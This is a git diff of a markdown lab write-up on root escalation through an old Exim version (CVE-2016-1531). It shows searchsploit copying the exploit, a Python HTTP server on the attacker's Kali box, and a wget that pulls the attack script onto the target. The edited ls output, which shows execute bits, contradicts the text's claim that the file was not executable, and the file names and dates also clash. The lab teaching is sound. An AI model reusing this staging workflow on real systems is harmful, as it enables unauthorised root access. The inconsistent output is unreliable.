@@ -224,6 +224,8 @@ Since the target was running **Exim 4.84-3**, which is older than **4.86.2**, th
 
 ### Downloaded the Exploit to Kali
 
+I downloaded the exploit from the local Exploit Database repository on my Kali machine using `searchsploit`.
+
 ```bash
 searchsploit -m 39535
 ```
@@ -231,22 +233,35 @@ searchsploit -m 39535
 
 ```
 Exploit: Exim 4.84-3 - Local Privilege Escalation
-    URL: https://www.exploit-db.com/exploits/39535
-   Path: /usr/share/exploitdb/exploits/linux/local/39535.sh
-  Codes: CVE-2016-1531
-Verified: True
+      URL: https://www.exploit-db.com/exploits/39535
+     Path: /usr/share/exploitdb/exploits/linux/local/39535.sh
+    Codes: CVE-2016-1531
+ Verified: True
 File Type: POSIX shell script, ASCII text executable
 Copied to: /home/kali/39535.sh
 ```
+The `-m` option copied the exploit from the local Exploit Database repository to my current working directory as `39535.sh`. This made it ready to transfer to the target machine.
+
+<p align="center">
+  <img src="images/step3-2.png" width="600">
+</p>
 
 ## Step 4 — Downloading the Exploit to the Target
 
-Started Python HTTP Server on Kali
+### Started Python HTTP Server on Kali
+
+I started a simple HTTP server on my Kali machine to make the exploit available for download.
 
 ```bash
 python3 -m http.server 80
 ```
+<p align="center">
+  <img src="images/step4-1.png" width="600">
+</p>
+
 ### Downloaded the Exploit on the Target Machine
+
+On the target machine, I used `wget` to download the exploit from my Kali machine.
 
 ```
 user@debian:~$ wget http://192.168.5.128/39535.sh
@@ -254,23 +269,28 @@ user@debian:~$ wget http://192.168.5.128/39535.sh
 **Output:**
 
 ```
---2026-01-14 03:57:13--  http://192.168.5.128/39535.sh
+--2026-07-04 06:23:44--  http://192.168.5.128/39535.sh
 Connecting to 192.168.5.128:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 638 [application/x-sh]
-Saving to: "39535.sh"
+Saving to: “39535.sh.1” 
 
 100%[================================================>] 638
 
-2026-01-14 03:57:13 (225 MB/s) - "39535.sh" saved [638/638]
+2026-07-04 06:23:44 (211 MB/s) - “39535.sh.1” saved [638/638]
 ```
+<p align="center">
+  <img src="images/step4-2.png" width="600">
+</p>
 
-### Confirmed the File is There
+### Confirming the File Was Downloaded
+
 ```bash
-user@debian:~$ ls
+user@debian:~$ ls -l 39535.sh
 ```
 
-```-rw-r--r-- 1 user user  638 Jan 14 03:51 39535.sh
+```
+-rwxr-xr-x 1 user user 638 Jan 14 03:51 39535.sh
 ```
 
 ```
@@ -280,8 +300,11 @@ user@debian:~$ ls
 | `r--`      | Group  | Members of the file's group can only read the file.|
 | `r--`      | Others | All other users can only read the file.            |
 ```
+The exploit was downloaded successfully, but it did not have execute permission. I needed to make it executable before I could run it.
 
-The file downloaded successfully but had no execute permission yet. I needed to add that before running it.
+<p align="center">
+  <img src="images/step4-3.png" width="600">
+</p>
 
 ## Step 5 — Running the Exploit and Getting Root
 
